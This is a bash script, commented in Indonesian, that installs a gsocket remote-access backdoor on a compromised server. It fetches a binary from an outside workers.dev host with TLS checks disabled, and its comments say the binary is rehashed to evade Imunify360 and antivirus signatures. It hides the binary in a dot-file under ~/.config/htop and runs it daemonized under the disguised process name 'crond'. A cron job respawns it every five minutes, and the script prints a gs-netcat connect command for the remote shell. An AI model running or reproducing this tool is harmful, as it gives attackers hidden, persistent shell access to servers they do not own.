#!/bin/bash
# ============================================================
# gsocket auto-deploy + bypass Imunify360 / AV
# Download binary (hash custom) -> hide -> chmod -> daemon
# Usage:
#   bash deploy.sh            # auto-generate secret
#   bash deploy.sh MYSECRET   # pakai secret sendiri
# ============================================================

set -u

# ---- Config ----
URL="https://long-tree-92f9.bkahwk.workers.dev/"
SECRET="${1:-}"
HIDDEN_NAME="crond"                 # nama proses tersamar di ps
BIN_DIR="${HOME:-/tmp}/.config/htop"
BIN="$BIN_DIR/.x"

# ---- HOME fallback (webshell kadang gak set HOME) ----
if [ -z "${HOME:-}" ]; then
    BIN_DIR="$(echo ~)/.config/htop"
    BIN="$BIN_DIR/.x"
fi

# ---- Generate secret kalau kosong ----
if [ -z "$SECRET" ]; then
    SECRET=$(head -c 18 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-zA-Z0-9' | head -c 18)
    [ -z "$SECRET" ] && SECRET="auto$(date +%s)"
fi

# ---- 1. Download binary (hash custom -> lolos signature AV) ----
mkdir -p "$BIN_DIR"
echo "[*] Downloading binary ..."
if command -v curl >/dev/null 2>&1; then
    curl -fsSLk --connect-timeout 15 "$URL" -o "$BIN" 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -T 15 "$URL" -O "$BIN" 2>/dev/null
else
    echo "[!] gak ada curl/wget" ; exit 1
fi

# ---- 2. Verifikasi + chmod ----
SZ=$(stat -c%s "$BIN" 2>/dev/null || echo 0)
if [ -z "$SZ" ] || [ "$SZ" -lt 1000000 ]; then
    echo "[!] Download gagal / file terlalu kecil ($SZ bytes). Cek URL."
    exit 1
fi
chmod 755 "$BIN"
echo "[+] Binary  : $BIN ($SZ bytes)"

# ---- 3. Kill daemon lama (kalau ada) ----
pkill -f "$BIN" 2>/dev/null
sleep 1

# ---- 4. Jalankan daemon (hidden process name + daemonize) ----
cd "$BIN_DIR" || exit 1
if command -v setsid >/dev/null 2>&1; then
    setsid bash -c "exec -a '$HIDDEN_NAME' '$BIN' -s '$SECRET' -l -i -D" </dev/null >/dev/null 2>&1 &
else
    nohup bash -c "exec -a '$HIDDEN_NAME' '$BIN' -s '$SECRET' -l -i -D" </dev/null >/dev/null 2>&1 &
fi
sleep 2

# ---- 5. Persistence: cron respawn tiap 5 menit ----
( crontab -l 2>/dev/null | grep -v "$BIN" ; echo "*/5 * * * * $BIN -s '$SECRET' -l -i -D 2>/dev/null" ) | crontab - 2>/dev/null

# ---- 6. Output ----
echo
echo "=============================================="
echo "[+] DEPLOYED OK"
echo "[+] Secret : $SECRET"
echo "[+] Connect: gs-netcat -s \"$SECRET\" -i"
echo "=============================================="
